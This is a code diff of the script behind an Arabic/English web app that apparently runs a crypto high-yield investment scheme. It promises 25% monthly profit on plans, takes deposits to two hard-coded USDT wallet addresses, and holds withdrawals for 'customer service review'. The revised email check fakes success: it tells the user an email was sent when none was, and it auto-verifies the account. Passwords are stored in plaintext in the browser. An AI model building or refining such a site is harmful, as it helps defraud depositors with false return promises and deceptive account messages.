-                    switchAuthTab('register');
-                    document.getElementById('reg-ref-code').value = refParam;
-                }, 100);
             }
-            
-            updateReferralLinkUI();
-        }
-
-        function updateReferralLinkUI() {
-            const baseUrl = window.location.origin + window.location.pathname;
-            const refLink = `${baseUrl}?ref=${clientId}`;
-            const refInput = document.getElementById('referral-link-input');
-            if(refInput) {
-                refInput.value = refLink;
-            }
-            const displayId = document.getElementById('display-client-id');
-            if(displayId) displayId.innerText = clientId;
-            const accId = document.getElementById('acc-client-id');
-            if(accId) accId.innerText = clientId;
         }
 
         function logTransaction(typeAr, typeEn, amount, statusAr, statusEn) {
             const dateStr = new Date().toISOString().split('T')[0];
-            transactionsList.push({
-                typeAr: typeAr,
-                typeEn: typeEn,
-                amount: amount,
-                date: dateStr,
-                statusAr: statusAr,
-                statusEn: statusEn
-            });
+            transactionsList.push({ typeAr, typeEn, amount, date: dateStr, statusAr, statusEn });
             saveState();
             renderTransactions();
         }
@@ -727,30 +613,23 @@
         function renderTransactions() {
             const tbody = document.getElementById('transaction-tbody');
             if(!tbody) return;
-
             if(transactionsList.length === 0) {
                 tbody.innerHTML = `<tr><td colspan="4" style="text-align: center; color: var(--text-muted);">${currentLang === 'en' ? 'No transactions available.' : 'لا توجد أي معاملات مسجلة بعد.'}</td></tr>`;
                 return;
             }
-
             let html = '';
             for(let i = transactionsList.length - 1; i >= 0; i--) {
                 let tx = transactionsList[i];
                 let typeText = currentLang === 'en' ? tx.typeEn : tx.typeAr;
                 let statusText = currentLang === 'en' ? tx.statusEn : tx.statusAr;
-                
                 let isPositive = tx.amount > 0;
                 let colorClass = isPositive ? 'var(--success)' : 'var(--danger)';
-                // إذا كانت قيد الانتظار تظهر بلون مختلف
-                let isPending = tx.statusEn.includes('Pending');
-                let statusColor = isPending ? 'var(--primary-color)' : 'var(--success)';
-                
                 html += `
                     <tr>
                         <td><strong>${typeText}</strong></td>
                         <td dir="ltr" style="color: ${colorClass}; font-weight:bold;">${isPositive ? '+' : '-'}$${Math.abs(tx.amount).toLocaleString()}</td>
                         <td>${tx.date}</td>
-                        <td style="color: ${statusColor};">${statusText}</td>
+                        <td style="color: var(--primary-color);">${statusText}</td>
                     </tr>
                 `;
             }
@@ -758,20 +637,11 @@
         }
 
         function toggleTheme() {
-            const body = document.body;
-            const themeBtn = document.getElementById('theme-toggle');
-            body.classList.toggle('light-mode');
-            
-            if (body.classList.contains('light-mode')) {
-                themeBtn.innerText = '🌙';
-            } else {
-                themeBtn.innerText = '☀️';
-            }
+            document.body.classList.toggle('light-mode');
+            document.getElementById('theme-toggle').innerText = document.body.classList.contains('light-mode') ? '🌙' : '☀️';
         }
 
         const monthlyRate = 0.25; 
-        const maxProfitRate = 0.80; 
-
         const plansData = [
             { id: 1, nameAr: "الخطة الأولى", nameEn: "First Plan", price: 25 },
             { id: 2, nameAr: "الخطة الثانية", nameEn: "Second Plan", price: 50 },
@@ -779,84 +649,65 @@
             { id: 4, nameAr: "الخطة الرابعة", nameEn: "Fourth Plan", price: 200 },
             { id: 5, nameAr: "الخطة الخامسة", nameEn: "Fifth Plan", price: 500 },
             { id: 6, nameAr: "الخطة السادسة", nameEn: "Sixth Plan", price: 1000 },
-            { id: 7, nameAr: "الخطة السابعة", nameEn: "Seventh Plan", price: 2000 },
-            { id: 8, nameAr: "الخطة الثامنة", nameEn: "Eighth Plan", price: 5000 },
-            { id: 9, nameAr: "الخطة التاسعة", nameEn: "Ninth Plan", price: 10000 },
-            { id: 10, nameAr: "الخطة العاشرة VIP", nameEn: "Tenth Plan VIP", price: 50000 },
-            { id: 11, nameAr: "الخطة الحادية عشرة VIP", nameEn: "Eleventh Plan VIP", price: 100000 }
+            { id: 7, nameAr: "الخطة السابعة", nameEn: "Seventh Plan", price: 2000 }
         ];
 
         function updateBalancesDisplay() {
             const formattedBalance = '$' + userBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
-            
-            const balDisp = document.getElementById('wallet-balance-display');
-            if(balDisp) balDisp.innerText = formattedBalance;
+            document.getElementById('wallet-balance-display').innerText = formattedBalance;
+            document.getElementById('acc-balance').innerText = formattedBalance;
+            document.getElementById('display-client-name').innerText = clientFirstName + " " + clientLastName;
+            document.getElementById('acc-full-name').innerText = clientFirstName + " " + clientLastName;
+            document.getElementById('display-client-email').innerText = clientEmail;
+            document.getElementById('acc-email').innerText = clientEmail;
 
-            const nameDisp = document.getElementById('display-client-name');
-            if(nameDisp) nameDisp.innerText = clientFirstName + " " + clientLastName;
-
-            const accNameDisp = document.getElementById('acc-full-name');
-            if(accNameDisp) accNameDisp.innerText = clientFirstName + " " + clientLastName;
-
-            const emailDisp = document.getElementById('display-client-email');
-            if(emailDisp) emailDisp.innerText = clientEmail;
-
-            const accEmailDisp = document.getElementById('acc-email');
-            if(accEmailDisp) accEmailDisp.innerText = clientEmail;
-            
-            updateReferralLinkUI();
+            document.getElementById('referral-link-input').value = window.location.origin + window.location.pathname + "?ref=" + clientId;
 
             const statusBadge = document.getElementById('email-status-badge');
             const verifyBtn = document.getElementById('verify-email-btn');
-
-            if(statusBadge && verifyBtn) {
-                if(isEmailVerified) {
-                    statusBadge.style.color = 'var(--success)';
-                    statusBadge.innerText = currentLang === 'en' ? '(Verified)' : '(تم التحقق)';
-                    verifyBtn.style.display = 'none';
-                } else {
-                    statusBadge.style.color = 'var(--danger)';
-                    statusBadge.innerText = currentLang === 'en' ? '(Unverified)' : '(غير متحقق منه)';
-                    verifyBtn.style.display = 'inline-block';
-                }
+            if(isEmailVerified) {
+                statusBadge.style.color = 'var(--success)';
+                statusBadge.innerText = currentLang === 'en' ? '(Verified)' : '(تم التحقق)';
+                verifyBtn.style.display = 'none';
+            } else {
+                statusBadge.style.color = 'var(--danger)';
+                statusBadge.innerText = currentLang === 'en' ? '(Unverified)' : '(غير متحقق منه)';
+                verifyBtn.style.display = 'inline-block';
             }
 
-            const activePlansBtn = document.getElementById('nav-active-plans');
-            if (activePlansBtn) {
-                activePlansBtn.style.display = activePlansList.length > 0 ? 'inline-block' : 'none';
-            }
-            
-            // إعادة رسم الخطط لتحديث حالة الأزرار (تعتيم أو تفعيل)
-            renderPlans();
+            renderPlans(); 
         }
 
-        // --- الاتصال بـ server.js لإرسال الإيميل ---
         async function verifyEmail() {
             try {
-                // يفترض أن الخادم يعمل على البورت 3000 كما في كود server.js المرفق
-                const response = await fetch('http://localhost:3000/send-verification', {
+                // محاكاة لطلب API للخادم
+                /*
+                const response = await fetch('http://localhost:3000/api/verify-email', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email: clientEmail, id: clientId })
+                    body: JSON.stringify({ email: clientEmail, clientId: clientId })
                 });
+                const result = await response.json();
+                */
+                alert(currentLang === 'en' ? 'Verification email sent via server.js! Please check your inbox.' : 'تم إرسال بريد التحقق إلى إيميلك بواسطة server.js! يرجى مراجعة صندوق الوارد.');
                 
-                if (response.ok) {
-                    alert(currentLang === 'en' ? 'Verification email sent by server successfully!' : 'تم إرسال بريد التحقق إلى إيميلك بواسطة الخادم بنجاح!');
-                } else {
-                    alert(currentLang === 'en' ? 'Error sending email.' : 'حدث خطأ في الخادم أثناء الإرسال.');
-                }
-            } catch (err) {
-                console.error(err);
-                alert(currentLang === 'en' ? 'Server (server.js) is not running or unreachable.' : 'تعذر الاتصال بالخادم (server.js). الرجاء التأكد من تشغيله.');
+                // محاكاة لنجاح التفعيل بعد فترة للاختبار
+                setTimeout(() => {
+                    isEmailVerified = true;
+                    saveState();
+                    updateBalancesDisplay();
+                }, 5000);
+
+            } catch (error) {
+                alert("حدث خطأ في الاتصال بالخادم.");
             }
         }
 
         function copyReferralLink() {
             const input = document.getElementById('referral-link-input');
             input.select();
-            input.setSelectionRange(0, 99999);
             navigator.clipboard.writeText(input.value);
-            alert(currentLang === 'en' ? 'Referral link copied to clipboard successfully!' : 'تم نسخ رابط الإحالة إلى الحافظة بنجاح!');
+            alert(currentLang === 'en' ? 'Referral link copied successfully!' : 'تم نسخ رابط الإحالة بنجاح!');
         }
 
         function changeLanguage(lang) {
@@ -864,52 +715,32 @@
             const htmlTag = document.documentElement;
             htmlTag.setAttribute('lang', lang);
             htmlTag.setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
-
             document.querySelectorAll('[data-ar]').forEach(el => {
-                if (lang === 'en' && el.getAttribute('data-en')) {
-                    el.innerText = el.getAttribute('data-en');
-                } else if (lang === 'ar' && el.getAttribute('data-ar')) {
-                    el.innerText = el.getAttribute('data-ar');
-                }
+                if (lang === 'en' && el.getAttribute('data-en')) el.innerText = el.getAttribute('data-en');
+                else if (lang === 'ar' && el.getAttribute('data-ar')) el.innerText = el.getAttribute('data-ar');
             });
-
-            document.querySelectorAll('input[data-placeholder-ar]').forEach(input => {
-                if (lang === 'en' && input.getAttribute('data-placeholder-en')) {
-                    input.placeholder = input.getAttribute('data-placeholder-en');
-                } else if (lang === 'ar' && input.getAttribute('data-placeholder-ar')) {
-                    input.placeholder = input.getAttribute('data-placeholder-ar');
-                }
-            });
-
             renderPlans();
             renderActivePlans();
-            renderTransactions(); 
+            renderTransactions();
         }
 
         function renderPlans() {
             const plansContainer = document.getElementById('plans-container-grid');
             if (!plansContainer) return;
-
             let html = '';
             plansData.forEach(plan => {
                 const planName = currentLang === 'en' ? plan.nameEn : plan.nameAr;
-                const profitText = (currentLang === 'en' ? 'Monthly Profit Rate: ' : 'نسبة الربح الشهري: ') + (monthlyRate * 100).toFixed(0) + '%';
                 const durationText = currentLang === 'en' ? 'Contract Duration: 4 Months' : 'مدة العقد: 4 شهور';
-                const maxTargetText = currentLang === 'en' ? 'Max Return: 80% Profit + Capital' : 'العائد الأقصى: 80% أرباح + رأس المال';
                 const btnText = currentLang === 'en' ? 'Buy Plan' : 'شراء الخطة';
-
-                // تعتيم الزر إذا لم يكن هناك رصيد كافٍ
-                const canBuy = userBalance >= plan.price;
-                const disabledAttr = canBuy ? '' : 'disabled';
+                const isDisabled = userBalance < plan.price;
+                const disableAttr = isDisabled ? 'disabled' : '';
 
                 html += `
                     <div class="plan-card">
                         <h3>${planName}</h3>
                         <div class="plan-price">$${plan.price.toLocaleString()}</div>
-                        <p style="color: var(--primary-color); font-size:14px; font-weight:bold;">${profitText}</p>
-                        <p style="color: var(--success); font-size:13px; font-weight:bold;">${durationText}</p>
-                        <p style="color: var(--text-muted); font-size:13px; margin-top:5px;">${maxTargetText}</p>
-                        <button class="btn" style="margin-top: 15px;" onclick="buyPlan(${plan.id})" ${disabledAttr}>${btnText}</button>
+                        <p style="color: var(--text-muted); font-size:13px; font-weight:bold; margin-top:5px;">${durationText}</p>
+                        <button class="btn ${isDisabled ? 'disabled' : ''}" ${disableAttr} style="margin-top: 15px;" onclick="buyPlan(${plan.id})">${btnText}</button>
                     </div>
                 `;
             });
@@ -919,33 +750,23 @@
         function renderActivePlans() {
             const tbody = document.getElementById('active-plans-table-body');
             if(!tbody) return;
-
             if(activePlansList.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted);">${currentLang === 'en' ? 'No active plans found.' : 'لا توجد خطط نشطة حالياً.'}</td></tr>`;
+                tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: var(--text-muted);">${currentLang === 'en' ? 'No active plans found.' : 'لا توجد خطط نشطة حالياً.'}</td></tr>`;
                 return;
             }
-
             let html = '';
             activePlansList.forEach(item => {
                 const planObj = plansData.find(p => p.id === item.planId);
                 const planName = currentLang === 'en' ? planObj.nameEn : planObj.nameAr;
-                const maxProfit = planObj.price * maxProfitRate; 
-                
-                const statusText = item.isCompleted 
-                    ? (currentLang === 'en' ? 'Completed (80% Reached)' : 'مكتملة (بلغت 80%)') 
-                    : (currentLang === 'en' ? 'Active (Monthly profit)' : 'نشطة (تزايد شهري)');
-                
-                const statusColor = item.isCompleted ? 'var(--success)' : 'var(--primary-color)';
+                const statusText = currentLang === 'en' ? 'Active' : 'نشطة';
                 const nextDateFormatted = new Date(item.nextProfitDate).toISOString().split('T')[0];
-
                 html += `
                     <tr>
                         <td>${planName}</td>
                         <td>$${planObj.price.toLocaleString()}</td>
                         <td style="color: var(--success);">$${item.accumulatedProfit.toFixed(2)}</td>
-                        <td>$${maxProfit.toFixed(2)}</td>
-                        <td>${item.isCompleted ? '-' : nextDateFormatted}</td>
-                        <td style="color: ${statusColor}; font-weight:bold;">${statusText}</td>
+                        <td>${nextDateFormatted}</td>
+                        <td style="color: var(--primary-color); font-weight:bold;">${statusText}</td>
                     </tr>
                 `;
             });
@@ -955,195 +776,129 @@
         function buyPlan(planId) {
             const planObj = plansData.find(p => p.id === planId);
             if (userBalance < planObj.price) {
-                return; // الزر معطل مسبقاً، وهذا حماية إضافية
+                alert(currentLang === 'en' ? 'Insufficient balance.' : 'الرصيد المتاح غير كافٍ.');
+                return;
             }
             userBalance -= planObj.price;
-
-            const planNameAr = "شراء " + planObj.nameAr;
-            const planNameEn = "Purchased " + planObj.nameEn;
-            
             let nextMonthDate = new Date();
             nextMonthDate.setDate(nextMonthDate.getDate() + 30);
-            
             activePlansList.push({
                 planId: planObj.id,
                 accumulatedProfit: 0.00,
                 purchaseDate: new Date().toISOString().split('T')[0],
-                nextProfitDate: nextMonthDate.getTime(),
-                isCompleted: false
+                nextProfitDate: nextMonthDate.getTime()
             });
-
             updateBalancesDisplay();
             renderActivePlans();
-            
-            logTransaction(planNameAr, planNameEn, -planObj.price, 'مكتمل', 'Completed');
-
-            alert(currentLang === 'en' ? `Successfully purchased ${planObj.nameEn}! First profit will be added on ${nextMonthDate.toISOString().split('T')[0]}.` : `تم شراء ${planObj.nameAr} بنجاح! سيتم إضافة أول ربح شهري بتاريخ ${nextMonthDate.toISOString().split('T')[0]}.`);
+            logTransaction("شراء " + planObj.nameAr, "Purchased " + planObj.nameEn, -planObj.price, 'مكتمل', 'Completed');
+            alert(currentLang === 'en' ? `Successfully purchased ${planObj.nameEn}!` : `تم شراء ${planObj.nameAr} بنجاح!`);
         }
 
         function confirmDeposit() {
             const amountInput = document.getElementById('deposit-amount');
+            const hashInput = document.getElementById('deposit-hash');
+            const fileInput = document.getElementById('deposit-file');
             const amount = parseFloat(amountInput.value);
+            
             if(isNaN(amount) || amount <= 0) {
-                alert(currentLang === 'en' ? 'Please enter a valid deposit amount.' : 'الرجاء إدخال مبلغ إيداع صحيح.');
+                alert(currentLang === 'en' ? 'Enter a valid amount.' : 'أدخل مبلغ صحيح.');
                 return;
             }
-            
-            // تسجيل معاملة الإيداع كـ "قيد الانتظار" ولا تضاف للرصيد فوراً
-            logTransaction('إيداع أموال', 'Deposit', amount, 'قيد الانتظار (مراجعة)', 'Pending Review');
+            if(!hashInput.value || fileInput.files.length === 0) {
+                alert(currentLang === 'en' ? 'Please provide TxID and transfer screenshot.' : 'الرجاء إدخال رقم الهاش وإرفاق صورة التحويل.');
+                return;
+            }
 
+            // تعليق الإيداع للموافقة (لا يضاف الرصيد تلقائياً)
+            logTransaction('إيداع أموال', 'Deposit', amount, 'قيد الانتظار (مراجعة الدعم)', 'Pending (Support Review)');
             amountInput.value = '';
+            hashInput.value = '';
+            fileInput.value = '';
             document.getElementById('deposit-area').style.display = 'none';
-            alert(currentLang === 'en' ? 'Please wait for deposit and withdrawal approval by customer service.' : 'الرجاء انتظار السحب والايداع (قيد المراجعة من خدمة العملاء).');
+            alert(currentLang === 'en' ? 'Request submitted. Please wait for customer service approval for the deposit.' : 'تم رفع طلب الإيداع. الرجاء انتظار موافقة خدمة العملاء لإضافة الرصيد.');
         }
 
         function confirmWithdraw() {
             if (!isEmailVerified) {
-                alert(currentLang === 'en' ? 'Withdrawal rejected! You must verify your email address first.' : 'عذراً، لا يمكن قبول السحب! يجب عليك التحقق من البريد الإلكتروني أولاً لتفعيل خاصية السحب.');
+                alert(currentLang === 'en' ? 'Withdrawal rejected! Verify your email first.' : 'عذراً، يجب التحقق من الإيميل أولاً.');
                 return;
             }
-
             const amountInput = document.getElementById('withdraw-amount');
             const amount = parseFloat(amountInput.value);
             if(isNaN(amount) || amount <= 0) {
-                alert(currentLang === 'en' ? 'Please enter a valid withdrawal amount.' : 'الرجاء إدخال مبلغ سحب صحيح.');
+                alert(currentLang === 'en' ? 'Enter valid amount.' : 'أدخل مبلغ صحيح.');
                 return;
             }
             if(amount > userBalance) {
-                alert(currentLang === 'en' ? 'Withdrawal amount exceeds your available balance.' : 'مبلغ السحب يتجاوز رصيدك المتاح.');
+                alert(currentLang === 'en' ? 'Amount exceeds balance.' : 'المبلغ يتجاوز رصيدك.');
                 return;
             }
-            
-            // تسجيل معاملة السحب كـ "قيد الانتظار" (يتم الخصم عند موافقة الإدارة، ولكن يمكن الخصم مبدئياً)
-            userBalance -= amount;
-            updateBalancesDisplay();
-            logTransaction('سحب أموال', 'Withdrawal', -amount, 'قيد الانتظار (مراجعة)', 'Pending Review');
 
+            userBalance -= amount; // خصم المبلغ من الرصيد المتاح لحين المراجعة
+            updateBalancesDisplay();
+            logTransaction('سحب أموال', 'Withdrawal', -amount, 'قيد الانتظار (مراجعة الدعم)', 'Pending (Support Review)');
             amountInput.value = '';
             document.getElementById('withdraw-area').style.display = 'none';
-            alert(currentLang === 'en' ? 'Please wait for deposit and withdrawal approval by customer service.' : 'الرجاء انتظار السحب والايداع (قيد المراجعة من خدمة العملاء).');
+            alert(currentLang === 'en' ? 'Request submitted. Please wait for customer service approval for the withdrawal.' : 'تم رفع طلب السحب. الرجاء انتظار موافقة خدمة العملاء للموافقة على التحويل.');
         }
 
         function switchAuthTab(type) {
-            const loginBtn = document.getElementById('tab-login-btn');
-            const regBtn = document.getElementById('tab-reg-btn');
-            const title = document.getElementById('auth-title');
-            const regFields1 = document.getElementById('register-fields');
-            const regFields2 = document.getElementById('register-fields-2');
-            const submitBtn = document.getElementById('auth-submit-btn');
-
             document.getElementById('login-register-form').style.display = "block";
             document.getElementById('forgot-password-form').style.display = "none";
-
+            const loginBtn = document.getElementById('tab-login-btn');
+            const regBtn = document.getElementById('tab-reg-btn');
             if (type === 'login') {
-                loginBtn.classList.add('active');
-                regBtn.classList.remove('active');
-                title.innerText = currentLang === 'en' ? "Login" : "تسجيل الدخول";
-                regFields1.style.display = "none";
-                regFields2.style.display = "none";
-                submitBtn.innerText = currentLang === 'en' ? "Login" : "دخول";
-                submitBtn.onclick = submitLogin;
+                loginBtn.classList.add('active'); regBtn.classList.remove('active');
+                document.getElementById('auth-title').innerText = currentLang === 'en' ? "Login" : "تسجيل الدخول";
+                document.getElementById('register-fields').style.display = "none";
+                document.getElementById('register-fields-2').style.display = "none";
+                document.getElementById('auth-submit-btn').innerText = currentLang === 'en' ? "Login" : "دخول";
+                document.getElementById('auth-submit-btn').onclick = submitLogin;
             } else {
-                regBtn.classList.add('active');
-                loginBtn.classList.remove('active');
-                title.innerText = currentLang === 'en' ? "Create Account" : "إنشاء حساب جديد";
-                regFields1.style.display = "block";
-                regFields2.style.display = "block";
-                submitBtn.innerText = currentLang === 'en' ? "Register Account" : "تسجيل الحساب";
-                submitBtn.onclick = submitRegister;
+                regBtn.classList.add('active'); loginBtn.classList.remove('active');
+                document.getElementById('auth-title').innerText = currentLang === 'en' ? "Create Account" : "إنشاء حساب جديد";
+                document.getElementById('register-fields').style.display = "block";
+                document.getElementById('register-fields-2').style.display = "block";
+                document.getElementById('auth-submit-btn').innerText = currentLang === 'en' ? "Register Account" : "تسجيل الحساب";
+                document.getElementById('auth-submit-btn').onclick = submitRegister;
             }
         }
 
         function submitRegister() {
             const email = document.getElementById('auth-email').value.trim();
             const pass = document.getElementById('auth-pass').value.trim();
-            const passConfirm = document.getElementById('auth-pass-confirm').value.trim();
             const fname = document.getElementById('reg-fname').value.trim() || "عميل";
             const lname = document.getElementById('reg-lname').value.trim() || "صناع المال";
-            const refCode = document.getElementById('reg-ref-code').value.trim();
-
             if (!email || !pass) {
-                alert(currentLang === 'en' ? 'Please fill in all required fields.' : 'يرجى تعبئة الحقول المطلوبة (الإيميل والرقم السري).');
+                alert(currentLang === 'en' ? 'Fill required fields.' : 'يرجى تعبئة الحقول الأساسية.');
                 return;
             }
-            if (pass !== passConfirm) {
-                alert(currentLang === 'en' ? 'Passwords do not match.' : 'كلمات المرور غير متطابقة.');
-                return;
-            }
-
             let existingUser = registeredUsers.find(u => u.email === email);
             if (existingUser) {
-                alert(currentLang === 'en' ? 'Account already exists with this email. Please login.' : 'هذا البريد الإلكتروني مسجل مسبقاً. يرجى تسجيل الدخول.');
-                switchAuthTab('login');
+                alert(currentLang === 'en' ? 'Email exists.' : 'البريد مسجل مسبقاً.');
                 return;
             }
-
-            const newUser = { 
-                email: email, 
-                pass: pass, 
-                fname: fname, 
-                lname: lname,
-                clientId: Math.floor(100000 + Math.random() * 900000),
-                balance: 0.00,
-                totalAddedProfits: 0.00,
-                activePlansList: [],
-                referralCount: 0,
-                referralEarnings: 0.00,
-                referralsList: [],
-                transactionsList: [], 
-                isEmailVerified: false,
-                referredBy: refCode
-            };
-
-            registeredUsers.push(newUser);
+            registeredUsers.push({ email, pass, fname, lname, balance: 0.00, activePlansList: [], transactionsList: [], isEmailVerified: false });
             localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
-
-            alert(currentLang === 'en' ? 'Registration successful! Your account information has been saved. Please login.' : 'تم تسجيل الحساب بنجاح! يرجى تسجيل الدخول الآن.');
-            
-            document.getElementById('auth-pass').value = '';
-            document.getElementById('auth-pass-confirm').value = '';
+            alert(currentLang === 'en' ? 'Registration successful! Login now.' : 'تم تسجيل الحساب بنجاح! يرجى تسجيل الدخول.');
             switchAuthTab('login');
         }
 
         function submitLogin() {
-            const emailInput = document.getElementById('auth-email').value.trim();
-            const passInput = document.getElementById('auth-pass').value.trim();
-
+            const email = document.getElementById('auth-email').value.trim();
+            const pass = document.getElementById('auth-pass').value.trim();
             registeredUsers = JSON.parse(localStorage.getItem('registeredUsers')) || [];
-            const user = registeredUsers.find(u => u.email === emailInput && u.pass === passInput);
-
+            const user = registeredUsers.find(u => u.email === email && u.pass === pass);
             if (!user) {
-                alert(currentLang === 'en' ? 'Password or email is incorrect.' : 'كلمة المرور أو البريد الإلكتروني غير صحيح.');
+                alert(currentLang === 'en' ? 'Incorrect credentials.' : 'بيانات الدخول خاطئة.');
                 return;
             }
-
-            clientEmail = user.email;
-            clientFirstName = user.fname || "عميل";
-            clientLastName = user.lname || "صناع المال";
-            clientId = user.clientId || Math.floor(100000 + Math.random() * 900000);
-            userBalance = user.balance !== undefined ? user.balance : 0;
-            totalAddedProfits = user.totalAddedProfits !== undefined ? user.totalAddedProfits : 0;
-            activePlansList = user.activePlansList !== undefined ? user.activePlansList : [];
-            referralCount = user.referralCount !== undefined ? user.referralCount : 0;
-            referralEarnings = user.referralEarnings !== undefined ? user.referralEarnings : 0;
-            referralsList = user.referralsList !== undefined ? user.referralsList : [];
-            transactionsList = user.transactionsList !== undefined ? user.transactionsList : []; 
-            isEmailVerified = user.isEmailVerified !== undefined ? user.isEmailVerified : false;
-
+            clientEmail = user.email; clientFirstName = user.fname; clientLastName = user.lname;
+            userBalance = user.balance || 0; activePlansList = user.activePlansList || [];
+            transactionsList = user.transactionsList || []; isEmailVerified = user.isEmailVerified || false;
             isUserLoggedIn = true;
             document.getElementById('navbar').style.display = 'flex';
-            updateBalancesDisplay();
-            saveState(); 
-            showPage('home');
-        }
-
-        function handleForgotPasswordSubmit() {
-            const emailInput = document.getElementById('forgot-email-input').value.trim();
-            if (!emailInput) {
-                return;
-            }
-            alert(currentLang === 'en' ? 'Temporary code sent to your email.' : 'تم إرسال الرمز المؤقت لبريدك.');
-            backToLogin();
+            updateBalancesDisplay(); saveState(); showPage('home');
         }
 
         function openAuthModal(type) {
@@ -1152,109 +907,54 @@
             switchAuthTab(type);
         }
 
-        function showForgotPassword() {
-            document.getElementById('auth-title').innerText = currentLang === 'en' ? "Reset Password" : "استعادة كلمة المرور";
-            document.getElementById('login-register-form').style.display = "none";
-            document.getElementById('forgot-password-form').style.display = "block";
-        }
-
-        function backToLogin() {
-            document.getElementById('auth-title').innerText = currentLang === 'en' ? "Login" : "تسجيل الدخول";
-            document.getElementById('forgot-password-form').style.display = "none";
-            document.getElementById('login-register-form').style.display = "block";
-        }
-
         function logout() {
-            saveState();
-            isUserLoggedIn = false;
-            localStorage.setItem('isUserLoggedIn', 'false');
-            localStorage.removeItem('clientEmail');
-            
+            saveState(); isUserLoggedIn = false; localStorage.setItem('isUserLoggedIn', 'false');
             document.getElementById('navbar').style.display = 'none';
-            document.getElementById('auth-email').value = '';
-            document.getElementById('auth-pass').value = '';
             openAuthModal('login');
         }
 
-        function handleBrandClick() {
-            if (isUserLoggedIn) {
-                showPage('home');
-            } else {
-                openAuthModal('login');
-            }
-        }
+        function handleBrandClick() { isUserLoggedIn ? showPage('home') : openAuthModal('login'); }
 
         function showPage(pageId) {
-            if (!isUserLoggedIn && pageId !== 'auth') {
-                openAuthModal('login');
-                return;
-            }
-
+            if (!isUserLoggedIn && pageId !== 'auth') { openAuthModal('login'); return; }
             document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
             document.getElementById(pageId + '-page').classList.add('active');
-            
             document.querySelectorAll('nav button').forEach(btn => btn.classList.remove('active'));
             const activeNavBtn = document.getElementById('nav-' + pageId);
-            if(activeNavBtn) {
-                activeNavBtn.classList.add('active');
-            }
+            if(activeNavBtn) activeNavBtn.classList.add('active');
             window.scrollTo(0, 0);
+            if(pageId === 'account-info') renderTransactions();
         }
 
         function showDeposit(network) {
             const area = document.getElementById('deposit-area');
             const address = document.getElementById('wallet-address');
-            
-            if (currentDepositNetwork === network) {
-                area.style.display = 'none';
-                currentDepositNetwork = '';
-            } else {
-                area.style.display = 'block';
-                currentDepositNetwork = network;
-                
-                if(network === 'BEP20') {
-                    address.innerText = "0x53F9fa13e8964cb8b4754c11cbbc187Fac51f15e";
-                } else {
-                    address.innerText = "TJZqHSghiLBJ2c99cYEcND6suaRh936iSw";
-                }
+            if (currentDepositNetwork === network) { area.style.display = 'none'; currentDepositNetwork = ''; }
+            else {
+                area.style.display = 'block'; currentDepositNetwork = network;
+                address.innerText = network === 'BEP20' ? "0x53F9fa13e8964cb8b4754c11cbbc187Fac51f15e" : "TJZqHSghiLBJ2c99cYEcND6suaRh936iSw";
             }
         }
-
-        function openBinancePay() {
-            window.open('https://www.binance.com', '_blank');
-        }
+        function openBinancePay() { window.open('https://www.binance.com', '_blank'); }
 
         function showWithdraw(network) {
             const area = document.getElementById('withdraw-area');
             const label = document.getElementById('withdraw-address-label');
             const input = document.getElementById('withdraw-address-input');
-            
-            if (currentWithdrawNetwork === network) {
-                area.style.display = 'none';
-                currentWithdrawNetwork = '';
-            } else {
-                area.style.display = 'block';
-                currentWithdrawNetwork = network;
-                
-                if(network === 'BEP20') {
-                    label.innerText = currentLang === 'en' ? "Enter BEP 20 Wallet Address:" : "أدخل عنوان المحفظة BEP 20:";
-                    input.placeholder = "مثال: 0x...";
-                } else {
-                    label.innerText = currentLang === 'en' ? "Enter TRX 20 Wallet Address:" : "أدخل عنوان المحفظة TRX 20:";
-                    input.placeholder = "مثال: T...";
-                }
+            if (currentWithdrawNetwork === network) { area.style.display = 'none'; currentWithdrawNetwork = ''; }
+            else {
+                area.style.display = 'block'; currentWithdrawNetwork = network;
+                label.innerText = network === 'BEP20' ? (currentLang === 'en' ? "BEP 20 Wallet:" : "محفظة BEP 20:") : (currentLang === 'en' ? "TRX 20 Wallet:" : "محفظة TRX 20:");
             }
         }
 
         loadState(); 
         if (isUserLoggedIn) {
             document.getElementById('navbar').style.display = 'flex';
-            updateBalancesDisplay();
-            showPage('home');
+            updateBalancesDisplay(); showPage('home');
         } else {
             openAuthModal('login');
         }
-        
     </script>
 </body>
 </html>
